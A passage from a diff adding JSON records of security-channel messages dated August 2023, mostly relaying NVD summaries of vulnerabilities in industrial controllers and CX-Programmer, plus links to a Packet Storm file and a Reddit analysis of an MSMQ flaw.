+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/173933/webcomcms10-sql.txt"
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38744 ‼\n\nDenial-of-service (DoS) vulnerability due to improper validation of specified type of input issue exists in the built-in EtherNet/IP port of the CJ Series CJ2 CPU unit and the communication function of the CS/CJ Series EtherNet/IP unit. If an affected product receives a packet which is specially crafted by a remote unauthenticated attacker, the unit of the affected product may fall into a denial-of-service (DoS) condition. Affected products/versions are as follows: CJ2M CPU Unit CJ2M-CPU3[] Unit version of the built-in EtherNet/IP section Ver. 2.18 and earlier, CJ2H CPU Unit CJ2H-CPU6[]-EIP Unit version of the built-in EtherNet/IP section Ver. 3.04 and earlier, CS/CJ Series EtherNet/IP Unit CS1W-EIP21 V3.04 and earlier, and CS/CJ Series EtherNet/IP Unit CJ1W-EIP21 V3.04 and earlier.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-3346 ‼\n\nBuffer Copy without Checking Size of Input ('Classic Buffer Overflow') vulnerability in MITSUBSHI CNC Series allows a remote unauthenticated attacker to cause Denial of Service (DoS) condition and execute arbitrary code on the product by sending specially crafted packets. In addition, system reset is required for recovery.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-03",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38748 ‼\n\nUse after free vulnerability exists in CX-Programmer Included in CX-One CXONE-AL[][]D-V4 V9.80 and earlier. By having a user open a specially crafted CXP file, information disclosure and/or arbitrary code execution may occur.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
     "date": "2023-08-03",
     "from_channel": "defcon_news",
     "message": "MSMQ QueueJumper (RCE Vulnerability): An In-Depth Technical Analysis\nhttps://www.reddit.com/r/netsec/comments/15gwu87/msmq_queuejumper_rce_vulnerability_an_indepth/",
